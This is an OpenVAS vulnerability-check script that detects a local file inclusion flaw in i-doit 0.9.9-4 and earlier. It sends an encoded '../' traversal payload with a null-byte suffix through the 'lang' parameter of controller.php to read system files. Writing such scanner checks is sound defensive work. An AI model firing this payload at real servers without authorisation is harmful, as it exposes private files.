###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_i_doit_lang_parameter_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# i-doit 'lang' Parameter Local File Include Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to gain sensitive information.
  Impact Level: Application";
tag_affected = "i-doit version 0.9.9-4 and earlier.";
tag_insight = "The flaw is caused by improper validation of user supplied input via the
  'lang' parameter in 'controller.php', which allows attackers to read
  arbitrary files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 23rd June 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.i-doit.org/";
tag_summary = "This host is running I-doit and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_id(902601);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_bugtraq_id(47972);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("i-doit 'lang' Parameter Local File Include Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17320/");

  script_description(desc);
  script_summary("Check for local file inclusion vulnerability in i-doit");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!can_host_php(port:port)){
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/idoit", "/", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("i-doit.org" >< res && "<title>i-doit - </title>" >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Constructs exploit string
      url = string(dir, "/controller.php?load=&lang=..%2f..%2f..%2f..%2f" +
                        "..%2f..%2f..%2f..%2f", files[file],"%00.jpg");

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        security_hole(port:port);
        exit(0);
      }
    }
  }
}
